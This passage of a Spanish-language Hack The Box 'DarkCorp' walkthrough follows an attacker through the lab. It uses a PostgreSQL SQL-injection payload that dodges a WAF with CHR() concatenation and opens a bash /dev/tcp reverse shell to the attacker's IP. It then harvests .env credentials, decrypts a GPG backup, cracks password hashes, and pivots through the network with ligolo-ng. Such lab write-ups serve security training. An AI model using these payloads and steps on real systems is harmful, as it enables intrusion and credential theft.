> Al consultar la página de `PayloadsAllTheThings`, encontramos una técnica de bypass utilizando la función `CHR()`. Esta metodología consiste en construir dinámicamente comandos mediante la concatenación de caracteres representados numéricamente en ASCII. De esta forma, en lugar de escribir directamente `COPY`, lo generamos mediante `CHR(67)||CHR(79)||CHR(80)||CHR(89)`, lo que nos permite evadir filtros basados en detección de palabras clave, ya que el WAF no reconocería el comando en su forma canónica.
{: .prompt-info }

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_57.png)

Con lo cual, decidimos de nuevo ponernos en escucha para recibir nuestra reverse shell mediante la inyección SQL.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
```

Utilizaremos el siguiente payload que lo que realizará es utilizar un bloque anónimo `DO $reverse$...` donde se construirá dinámicamente el comando `COPY` de PostgreSQL ejecutando el comando `EXECUTE` para lograr obtener una Reverse Shell. 

```sql
'';DO $reverse$
DECLARE
    s text;
BEGIN
    s := CHR(67)||CHR(79)||CHR(80)||CHR(89)||
         ' (SELECT '''') TO PROGRAM ' ||
         quote_literal('bash -c "bash -i >& /dev/tcp/10.10.16.9/443 0>&1"');
    EXECUTE s;
END $reverse$;
```

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_30.png)

Al enviar la petición con el payload de la Reverse Shell de **PostgreSQL**, verificamos que finalmente logramos obtener acceso al equipo `drip.darkcorp.htb` bajo el contexto del usuario `postgresql`.

Una vez obtenido el acceso, realizaremos el tratamiento de la TTY para obtener una terminal interactiva.

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.11.54] 59098
bash: cannot set terminal process group (11741): Inappropriate ioctl for device
bash: no job control in this shell
postgres@drip:/var/lib/postgresql/15/main$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
postgres@drip:/var/lib/postgresql/15/main$ ^Z
[1]  + 84656 suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + 84656 continued  nc -nlvp 443
                                    reset xterm
postgres@drip:/var/lib/postgresql/15/main$ export TERM=xterm
postgres@drip:/var/lib/postgresql/15/main$ export SHELL=bash
postgres@drip:/var/lib/postgresql/15/main$ stty rows 48 columns 229
```
---

## Shell as ebeldord on DRIP

### Information Leakage

Tal y como verificamos en la enumeración inicial, en la ruta `/var/www/html/dashboard/` se localizaba un archivo `.env` el cual dispone de credenciales de acceso a la base de datos.

```bash
postgres@drip:/var/www/html/dashboard$ ls -la
total 36
drwxr-xr-x 5 root root 4096 Jan 16 00:22 .
drwxr-xr-x 4 root root 4096 Jan 13 06:37 ..
drwxr-xr-x 7 root root 4096 Jan 10 11:51 apps
lrwxrwxrwx 1 root root   18 Dec 19 19:25 app_venv -> /var/www/app_venv/
-rw-r--r-- 1 root root  796 Jan 15 20:43 .env
-rw-r--r-- 1 root root  198 Dec 17 14:54 gunicorn-cfg.py
drwxr-xr-x 2 root root 4096 Jan 10 11:51 media
drwxr-xr-x 2 root root 4096 Jan 10 11:51 __pycache__
-rw-r--r-- 1 root root  330 Dec 17 14:54 requirements.txt
-rw-r--r-- 1 root root 1037 Dec 19 11:58 run.py
postgres@drip:/var/www/html/dashboard$ cat .env
# True for development, False for production
DEBUG=False

# Flask ENV
FLASK_APP=run.py
FLASK_ENV=development

# If not provided, a random one is generated 
# SECRET_KEY=<YOUR_SUPER_KEY_HERE>

# Used for CDN (in production)
# No Slash at the end
ASSETS_ROOT=/static/assets

# If DB credentials (if NOT provided, or wrong values SQLite is used) 
DB_ENGINE=postgresql
DB_HOST=localhost
DB_NAME=dripmail
DB_USERNAME=dripmail_dba
DB_PASS=2Qa2SsBkQvsc
DB_PORT=5432

SQLALCHEMY_DATABASE_URI = 'postgresql://dripmail_dba:2Qa2SsBkQvsc@localhost/dripmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'GCqtvsJtexx5B7xHNVxVj0y2X0m10jq'
MAIL_SERVER = 'drip.htb'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
MAIL_USERNAME = None
MAIL_PASSWORD = None
MAIL_DEFAULT_SENDER = 'support@drip.htb'
```
---

### Decrypting GPG file

Revisando la ruta `/var/backups/postgres`, verificamos que disponemos de un archivo `GPG` de un backup SQL. El archivo está encriptado por `GPG`.

> **GPG** en Linux es una herramienta de línea de comandos llamada **GNU Privacy Guard** que se utiliza para cifrar y firmar digitalmente archivos y comunicaciones, garantizando su seguridad y autenticidad. Funciona con criptografía de clave pública, utilizando un par de claves (una pública y una privada) para cifrar datos que solo pueden ser descifrados por quien posee la clave privada correspondiente. 
{: .prompt-info }

```bash
postgres@drip:/var/backups/postgres$ ls -l
total 4
-rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg
postgres@drip:/var/backups/postgres$ file dev-dripmail.old.sql.gpg 
dev-dripmail.old.sql.gpg: PGP RSA encrypted session key - keyid: 11123366 61D8BC1F RSA (Encrypt or Sign) 3072b .
```

A la hora de querer descifrar el archivo `GPG` que contiene el backup SQL, se nos requiere ingresar el `passphrase` el cual indicaremos las credenciales del usuario de la base de datos que obtuvimos en el archivo `.env`.

```bash
postgres@drip:/var/backups/postgres$ gpg --decrypt -o dev-dripmail.old.sql dev-dripmail.old.sql.gpg
```

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_31.png)

Verificamos que finalmente logramos desencriptar el archivo `GPG` y obtenemos un archivo llamado `dev-dripmail.old.sql`.

```bash
postgres@drip:/var/backups/postgres$ gpg --decrypt -o dev-dripmail.old.sql dev-dripmail.old.sql.gpg
gpg: encrypted with 3072-bit RSA key, ID 1112336661D8BC1F, created 2025-01-08
      "postgres <postgres@drip.darkcorp.htb>"
postgres@drip:/var/backups/postgres$ ls -l
total 12
-rw------- 1 postgres postgres 4774 Apr 16 12:59 dev-dripmail.old.sql
-rw-r--r-- 1 postgres postgres 1784 Feb  5 12:52 dev-dripmail.old.sql.gpg
```
----
### Analyzing Database backup

A la hora de analizar el backup SQL desencriptado, verificamos diferente tipo de información relevante.

De toda la información obtenida, lo que más nos llamó la atención fueron estos nombres de usuario con sus respectivos hashes.

> 1	  bcase	      dc5484871bc95c4eab58032884be7225	  bcase@drip.htb

> 2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb

> 3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb

> 4   support	  d9b9ecbf29db8054b21f303072b37c4e    support@drip.htb

```bash
postgres@drip:/var/backups/postgres$ strings dev-dripmail.old.sql
-- PostgreSQL database dump
-- Dumped from database version 15.10 (Debian 15.10-0+deb12u1)
-- Dumped by pg_dump version 15.10 (Debian 15.10-0+deb12u1)
SET statement_timeout = 0;
SET lock_timeout = 0;
SET idle_in_transaction_session_timeout = 0;
SET client_encoding = 'UTF8';
SET standard_conforming_strings = on;
SELECT pg_catalog.set_config('search_path', '', false);
SET check_function_bodies = false;
SET xmloption = content;
SET client_min_messages = warning;
SET row_security = off;
SET default_tablespace = '';
SET default_table_access_method = heap;
-- Name: Admins; Type: TABLE; Schema: public; Owner: postgres
CREATE TABLE public."Admins" (
    id integer NOT NULL,
    username character varying(80),
    password character varying(80),
    email character varying(80)
ALTER TABLE public."Admins" OWNER TO postgres;
-- Name: Admins_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
CREATE SEQUENCE public."Admins_id_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;
ALTER TABLE public."Admins_id_seq" OWNER TO postgres;
-- Name: Admins_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
ALTER SEQUENCE public."Admins_id_seq" OWNED BY public."Admins".id;
-- Name: Users; Type: TABLE; Schema: public; Owner: postgres
CREATE TABLE public."Users" (
    id integer NOT NULL,
    username character varying(80),
    password character varying(80),
    email character varying(80),
    host_header character varying(255),
    ip_address character varying(80)
ALTER TABLE public."Users" OWNER TO postgres;
-- Name: Users_id_seq; Type: SEQUENCE; Schema: public; Owner: postgres
CREATE SEQUENCE public."Users_id_seq"
    AS integer
    START WITH 1
    INCREMENT BY 1
    NO MINVALUE
    NO MAXVALUE
    CACHE 1;
ALTER TABLE public."Users_id_seq" OWNER TO postgres;
-- Name: Users_id_seq; Type: SEQUENCE OWNED BY; Schema: public; Owner: postgres
ALTER SEQUENCE public."Users_id_seq" OWNED BY public."Users".id;
-- Name: Admins id; Type: DEFAULT; Schema: public; Owner: postgres
ALTER TABLE ONLY public."Admins" ALTER COLUMN id SET DEFAULT nextval('public."Admins_id_seq"'::regclass);
-- Name: Users id; Type: DEFAULT; Schema: public; Owner: postgres
ALTER TABLE ONLY public."Users" ALTER COLUMN id SET DEFAULT nextval('public."Users_id_seq"'::regclass);
-- Data for Name: Admins; Type: TABLE DATA; Schema: public; Owner: postgres
COPY public."Admins" (id, username, password, email) FROM stdin;
1	bcase	dc5484871bc95c4eab58032884be7225	bcase@drip.htb
2   victor.r    cac1c7b0e7008d67b6db40c03e76b9c0    victor.r@drip.htb
3   ebelford    8bbd7f88841b4223ae63c8848969be86    ebelford@drip.htb
-- Data for Name: Users; Type: TABLE DATA; Schema: public; Owner: postgres
COPY public."Users" (id, username, password, email, host_header, ip_address) FROM stdin;
5001	support	d9b9ecbf29db8054b21f303072b37c4e	support@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
5002	bcase	1eace53df87b9a15a37fdc11da2d298d	bcase@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
5003	ebelford	0cebd84e066fd988e89083879e88c5f9	ebelford@drip.htb	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 OPR/114.0.0.0	10.0.50.10
-- Name: Admins_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
SELECT pg_catalog.setval('public."Admins_id_seq"', 1, true);
-- Name: Users_id_seq; Type: SEQUENCE SET; Schema: public; Owner: postgres
SELECT pg_catalog.setval('public."Users_id_seq"', 5003, true);
-- Name: Admins Admins_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
ALTER TABLE ONLY public."Admins"
    ADD CONSTRAINT "Admins_pkey" PRIMARY KEY (id);
-- Name: Users Users_pkey; Type: CONSTRAINT; Schema: public; Owner: postgres
ALTER TABLE ONLY public."Users"
    ADD CONSTRAINT "Users_pkey" PRIMARY KEY (id);
-- Name: TABLE "Admins"; Type: ACL; Schema: public; Owner: postgres
GRANT SELECT ON TABLE public."Admins" TO dripmail_dba;
-- Name: SEQUENCE "Admins_id_seq"; Type: ACL; Schema: public; Owner: postgres
GRANT ALL ON SEQUENCE public."Admins_id_seq" TO dripmail_dba;
-- Name: TABLE "Users"; Type: ACL; Schema: public; Owner: postgres
GRANT SELECT ON TABLE public."Users" TO dripmail_dba;
-- Name: SEQUENCE "Users_id_seq"; Type: ACL; Schema: public; Owner: postgres
GRANT ALL ON SEQUENCE public."Users_id_seq" TO dripmail_dba;
-- PostgreSQL database dump complete
```
---
### Cracking Hashes

Para poder crackear los hashes obtenidos del punto anterior, visitaremos la siguiente página web [https://crackstation.net/](https://crackstation.net/).

Al intentar crackear los hashes, verificamos que solamente que hemos logrado crackear dos de los hashes correspondientes al usuario `victor.r@drip.htb` y `ebelford@drip.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_32.png)

Guardaremos estas nuevas credenciales en nuestro archivo `credentials.txt`.

```bash
❯ echo 'victor.r:victor1gustavo@#\nebelford:ThePlague61780' > credentials.txt
❯ cat credentials.txt
victor.r:victor1gustavo@#
ebelford:ThePlague61780
```

Verificamos que logramos acceder al equipo `drip.darkcorp.htb` con las credenciales del usuario `ebelford`.

```bash
❯ sshpass -p 'ThePlague61780' ssh ebelford@drip.htb
Linux drip 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have no mail.
Last login: Wed Feb  5 12:47:18 2025 from 172.16.20.1
ebelford@drip:~$ hostname -I; hostname
172.16.20.3 
drip
```

***

## Initial Foothold

### Discovering new hosts and ports (fscan)

Una vez teniendo de nuevo acceso en el equipo `drip.darkcorp.htb`, verificamos nuevamente que dispone de una dirección IP con el rango `172.16.20.0/24` la cual desde nuestro equipo de atacante no disponemos del acceso directo.

```bash
ebelford@drip:/tmp$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:15:5d:84:03:02 brd ff:ff:ff:ff:ff:ff
    inet 172.16.20.3/24 brd 172.16.20.255 scope global eth0
       valid_lft forever preferred_lft forever
```

Para realizar un escaneo de hosts y puertos desde el equipo "puente" el cual si disponemos de acceso, podemos hacer uso de herramientas como [fscan](https://github.com/shadow1ng/fscan) que nos permite realizar un escaneo de hosts y puertos.

En este caso, disponemos de los binarios en nuestro equipo y los compartiremos a través de un servidor web.

```bash
❯ ls -l /opt/fscan
.rwxrwxr-x gzzcoo gzzcoo 8.2 MB Fri Feb 14 13:57:46 2025  fscan
.rw-rw-r-- gzzcoo gzzcoo 8.3 MB Fri Feb 14 13:57:45 2025  fscan.exe

❯ python3 -m http.server 80 --directory /opt/fscan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde el equipo de `drip.darkcorp.htb`, nos descargaremos el binario de `fscan` y le daremos permisos de ejecución.

```bash
ebelford@drip:/tmp$ wget 10.10.16.9/fscan; chmod +x fscan
--2025-04-16 13:11:21--  http://10.10.16.9/fscan
Connecting to 10.10.16.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8585724 (8.2M) [application/octet-stream]
Saving to: ‘fscan’

fscan                                                     100%[==================================================================================================================================>]   8.19M  2.17MB/s    in 4.6s    

2025-04-16 13:11:26 (1.79 MB/s) - ‘fscan’ saved [8585724/8585724]
```

Ejecutaremos el binario de `fscan` indicándole el rango de IP `172.16.20.0/24` para realizar el escaneo de hosts y puertos. En el resultado obtenido, verificamos que ha realizado un descubrimiento a través de ICMP de 3 hosts en dicho rango con sus respectivos puertos abiertos.

```bash
ebelford@drip:/tmp$ ./fscan -h 172.16.20.0/24
┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-16 13:12:37] [INFO] 暴力破解线程数: 1
[2025-04-16 13:12:37] [INFO] 开始信息扫描
[2025-04-16 13:12:38] [INFO] CIDR范围: 172.16.20.0-172.16.20.255
[2025-04-16 13:12:38] [INFO] 生成IP范围: 172.16.20.0.%!d(string=172.16.20.255) - %!s(MISSING).%!d(MISSING)
[2025-04-16 13:12:38] [INFO] 解析CIDR 172.16.20.0/24 -> IP范围 172.16.20.0-172.16.20.255
[2025-04-16 13:12:38] [INFO] 最终有效主机数量: 256
[2025-04-16 13:12:38] [INFO] 开始主机扫描
[2025-04-16 13:12:38] [INFO] 正在尝试无监听ICMP探测...
[2025-04-16 13:12:38] [INFO] 当前用户权限不足,无法发送ICMP包
[2025-04-16 13:12:38] [INFO] 切换为PING方式探测...
[2025-04-16 13:12:38] [SUCCESS] 目标 172.16.20.1     存活 (ICMP)
[2025-04-16 13:12:38] [SUCCESS] 目标 172.16.20.2     存活 (ICMP)
[2025-04-16 13:12:38] [SUCCESS] 目标 172.16.20.3     存活 (ICMP)
[2025-04-16 13:12:44] [INFO] 存活主机数量: 3
[2025-04-16 13:12:44] [INFO] 有效端口数量: 233
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.2:80
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:80
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:22
[2025-04-16 13:12:44] [SUCCESS] 服务识别 172.16.20.1:22 => [ssh] 版本:9.2p1 Debian 2+deb12u3 产品:OpenSSH 系统:Linux 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3.]
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.3:80
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.3:22
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.2:135
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:135
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:88
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.2:445
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:445
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:443
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:389
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.2:139
[2025-04-16 13:12:44] [SUCCESS] 端口开放 172.16.20.1:139
[2025-04-16 13:12:44] [SUCCESS] 服务识别 172.16.20.3:22 => [ssh] 版本:9.2p1 Debian 2+deb12u3 产品:OpenSSH 系统:Linux 信息:protocol 2.0 Banner:[SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u3.]
[2025-04-16 13:12:49] [SUCCESS] 服务识别 172.16.20.1:80 => [http] 版本:1.22.1 产品:nginx
[2025-04-16 13:12:49] [SUCCESS] 服务识别 172.16.20.3:80 => [http] 版本:1.22.1 产品:nginx
[2025-04-16 13:12:50] [SUCCESS] 服务识别 172.16.20.1:88 => 
[2025-04-16 13:12:50] [SUCCESS] 服务识别 172.16.20.2:445 => 
[2025-04-16 13:12:50] [SUCCESS] 服务识别 172.16.20.1:445 => 
[2025-04-16 13:12:50] [SUCCESS] 服务识别 172.16.20.1:389 => 
[2025-04-16 13:12:50] [SUCCESS] 服务识别 172.16.20.2:139 =>  Banner:[.]
[2025-04-16 13:12:50] [SUCCESS] 服务识别 172.16.20.1:139 =>  Banner:[.]
[2025-04-16 13:12:52] [SUCCESS] 服务识别 172.16.20.2:80 => [http]
```

***

### Exploit network access with Ligolo-ng to gain access to all hosts on the subnetwork

Como hemos mencionado anteriormente, desde nuestro equipo atacante no disponemos de acceso a esa subred. Es por ello, que utilizaremos `ligolo-ng`. Desde nuestro equipo deberemos de disponer del `proxy` y `agent` de `ligolo-ng`. 

El binario `agent` es el que deberemos ejecutar desde el equipo `drip.darkcorp.htb`, es por ello que lo compartiremos a través de un servidor web.

> `Ligolo-ng` es una herramienta sencilla, ligera y rápida que permite a los pentesters establecer túneles desde una conexión TCP/TLS inversa utilizando una interfaz virtual `«tun»` (sin necesidad de SOCKS). A diferencia de `Chisel` u otras herramientas, con `Ligolo-ng` no necesitamos utilizar SOCKS, sino que a través de interfaces virtuales crearemos un túnel (al más puro estilo VPN).
>
> Gracias a esto, podremos ejecutar herramientas como Nmap sin tener que utilizar `proxychains`, por lo que las tareas de pivote se vuelven más fáciles y rápidas, ya que una de las ventajas de Ligolo-ng es una mejora significativa en el rendimiento de las conexiones en comparación con el uso de SOCKS. Tendremos conexiones más rápidas y estables.
{: .prompt-info }

```bash
❯ ls -l /opt/ligolo-ng
.rwxr-xr-x gzzcoo gzzcoo 5.8 MB Wed Jan  1 14:08:42 2025  agent
.rwxr-xr-x gzzcoo gzzcoo 5.9 MB Wed Jan  1 14:09:19 2025  agent.exe
.rwxr-xr-x gzzcoo gzzcoo  12 MB Wed Jan  1 14:11:00 2025  proxy

❯ python3 -m http.server 80 --directory /opt/ligolo-ng
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Desde el equipo `drip`, nos descargaremos el binario `agent` y le daremos permisos de ejecución.

```bash
ebelford@drip:/tmp$ wget 10.10.16.9/agent; chmod +x agent
--2025-04-16 13:14:25--  http://10.10.16.9/agent
Connecting to 10.10.16.9:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6033408 (5.8M) [application/octet-stream]
Saving to: ‘agent’

agent                                                     100%[==================================================================================================================================>]   5.75M  1.64MB/s    in 4.1s    

2025-04-16 13:14:30 (1.42 MB/s) - ‘agent’ saved [6033408/6033408]
```

Crearemos y activaremos la interfaz de `ligolo` y configuraremos la ruta para poder llegar al rango `172.16.20.0` desde la interfaz de `ligolo` que hemos creado.

```bash
❯ sudo ip tuntap add user $(whoami) mode tun ligolo
❯ sudo ip link set ligolo up
❯ sudo ip route add 172.16.20.0/24 dev ligolo
```

Desde nuestra máquina de atacante, deberemos de ejecutar el binario `proxy` de `ligolo-ng` para iniciar el servicio. Por defecto, `ligolo-ng` escuchará en el puerto `11601`.

```bash
❯ /opt/ligolo-ng/proxy --selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 048E5EB5EEAEE3EB8E8BBA07E08E790F1D805CB72946F25ADB4DAB9BCB3B891E 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.7.5

ligolo-ng »
```

Desde la máquina `drip.darkcorp.htb`, nos conectaremos mediante el binario `agent` hacía nuestro equipo donde tenemos el servidor proxy de `ligolo-ng` iniciado. Se nos indicará que la conexión ha sido establecida.

```bash
ebelford@drip:/tmp$ ./agent -connect 10.10.16.9:11601 -ignore-cert
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.16.9:11601"
```

Verificaremos que en la terminal donde tenemos nuestro proxy iniciado, nos ha llegado una nueva sesión de un agente. Indicaremos el comando `session` para poder elegir la sesión que queramos, en este caso la única que nos ha llegado.

Una vez seleccionada la sesión, deberemos de indicar el comando `start` para iniciar la tunelización.

```bash
❯ /opt/ligolo-ng/proxy --selfcert
WARN[0000] Using default selfcert domain 'ligolo', beware of CTI, SOC and IoC! 
WARN[0000] Using self-signed certificates               
ERRO[0000] Certificate cache error: acme/autocert: certificate cache miss, returning a new certificate 
WARN[0000] TLS Certificate fingerprint for ligolo is: 048E5EB5EEAEE3EB8E8BBA07E08E790F1D805CB72946F25ADB4DAB9BCB3B891E 
INFO[0000] Listening on 0.0.0.0:11601                   
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

  Made in France ♥            by @Nicocha30!
  Version: 0.7.5

ligolo-ng » INFO[0031] Agent joined.                                 id=e37d6067-c911-4736-aa1e-46b17987be63 name=ebelford@drip remote="10.10.11.54:59054"
ligolo-ng » session
? Specify a session : 1 - ebelford@drip - 10.10.11.54:59054 - e37d6067-c911-4736-aa1e-46b17987be63
[Agent : ebelford@drip] » start
[Agent : ebelford@drip] » INFO[0048] Starting tunnel to ebelford@drip (e37d6067-c911-4736-aa1e-46b17987be63) 
```

Verificaremos que desde nuestro equipo atacante, disponemos de conectividad con los hosts de la subred `172.16.20.0/24`.

```bash
❯ ping -c 1 172.16.20.1
PING 172.16.20.1 (172.16.20.1) 56(84) bytes of data.
64 bytes from 172.16.20.1: icmp_seq=1 ttl=64 time=181 ms

--- 172.16.20.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 181.434/181.434/181.434/0.000 ms

❯ ping -c 1 172.16.20.2
PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
64 bytes from 172.16.20.2: icmp_seq=1 ttl=64 time=185 ms

--- 172.16.20.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 184.903/184.903/184.903/0.000 ms

❯ ping -c 1 172.16.20.3
PING 172.16.20.3 (172.16.20.3) 56(84) bytes of data.
64 bytes from 172.16.20.3: icmp_seq=1 ttl=64 time=150 ms

--- 172.16.20.3 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 150.272/150.272/150.272/0.000 ms
```

----
### Reconnaissance new subnetwork

#### WEB-01 Reconnaissance

Realizaremos un primer reconocimiento básico de los nuevos hosts descubiertos. En este caso utilizaremos la herramienta de [iRecon](https://github.com/Gzzcoo/iRecon) que nos realizará un escaneo con `Nmap` de todos los puertos abiertos y nos creará un reporte web para visualizarlo correctamente.

En el resultado obtenido, verificamos que se nos proporciona información como el `hostname`, `domain`, `FQDN` del equipo `WEB-01.darkcorp.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_33.png)

Añadiremos el `Full-Query Domain Name (FQDN)` y el `hostname` del equipo `WEB-01$` en nuestro archivo `/etc/hosts`.

```bash
❯ echo '172.16.20.2 WEB-01.darkcorp.htb WEB-01' | sudo tee -a /etc/hosts
172.16.20.2 WEB-01.darkcorp.htb WEB-01
```

Al ingresar a [http://172.16.20.2:5000](http://172.16.20.2:5000]), se nos requiere ingresar credenciales de acceso. De las credenciales obtenidas solamente nos sirven las del usuario `victor.r@drip.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_34.png)

Al lograr acceder a la página web, verificamos que es un dashboard de monitorización de diferentes sistemas, entre los cuales nos aparecen los nombres de otros hosts y cuáles de ellos están operativos. Del resultado obtenido, comprobamos que el único host que se encuentra en estado `Operational` es el de `WEB-01$`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_35.png)

En [http://172.16.20.2:5000/check](http://172.16.20.2:5000/check) nos encontramos con la siguiente interfaz, la cual se nos proporcionan diferentes opciones sobre un listado de hosts para realizar un chequeo sobre los puerto 80, 443 y 8080 y revisar si están activos o no.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_37.png)

Decidimos tratar de interceptar y probar diversas funcionalidades de este punto de la página web. El principal problema es que para acceder requerimos de ingresar credenciales de acceso y debemos configurar `BurpSuite` para indicar nuestras credenciales de acceso. Es por ello, que podemos seguir la siguiente guía de [Configuring NTLM with BurpSuite](https://portswigger.net/support/configuring-ntlm-with-burp-suite).

Ingresaremos al apartado de `Settings` y buscaremos por `Authentication` en el buscador de la configuración. Llegaremos al apartado de `Platform authentication` el cual deberemos de añadir el nuevo método de acceso.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_58.png)

Deberemos de indicar las credenciales de acceso del usuario `victor.r` e indicar que se trata de una autenticación `NTLMv2`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_59.png)

Verificamos que al enviar la petición por `POST` que se tramita al hacerle click a `Check` en la página web, se nos indica en la respuesta que en este caso, el host `drip.darkcorp.htb` su puerto `80` (`HTTP`) se encuentra en estado `Up`.
 
![images](/assets/img/writeups/htb-darkcorp/DarkCorp_60.png)

Al tratar de modificar el campo `host` por uno diferente a los que nos viene por defecto e indicarle nuestra dirección IP u otra, la respuesta nos indica el mensaje de `Invalid input`. Parece ser que solamente podemos hacer uso de las opciones presentes en la página web.

Más adelante seguiremos explorando esta funcionalidad web para ver si logramos aprovecharnos de ella o no.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_61.png)

---

#### DC-01 Reconnaissance

Realizaremos un escaneo mediante [iRecon](https://github.com/gzzcoo/iRecon) sobre el equipo `172.16.20.1` el cual según descubrimos del escaneo de `fscan` se trataba de un Domain Controller.

Verificamos que por los puertos enumerados, efectivamente se trataría de Domain Controller del equipo con hostname `DC-01` del dominio `darkcorp.htb`.

![images](/assets/img/writeups/htb-darkcorp/DarkCorp_38.png)

Añadiremos esta nueva entrada en nuestro archivo `/etc/hosts`.

```bash
❯ echo '172.16.20.1 DC-01.darkcorp.htb DC-01 darkcorp.htb' | sudo tee -a /etc/hosts
172.16.20.1 DC-01.darkcorp.htb DC-01 darkcorp.htb
```

En el resultado del escaneo de puertos realizado, comprobamos que el equipo `DC-01` disponía de una página web `IIS` en el puerto `443`. Al realizar un escaneo de directorios en dicho host, nos encontramos con directorios como `/certsrv` que son referente al acceso web de `Active Directory Certificate Services (ADCS)`. Esto probablemente nos de un indicativo que el Domain Controller tiene el rol de `ADCS` configurado.

```bash
❯ gobuster dir -u 'https://DC-01.darkcorp.htb/' -w /usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS.txt -k -t 200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://DC-01.darkcorp.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/Web-Servers/IIS.txt
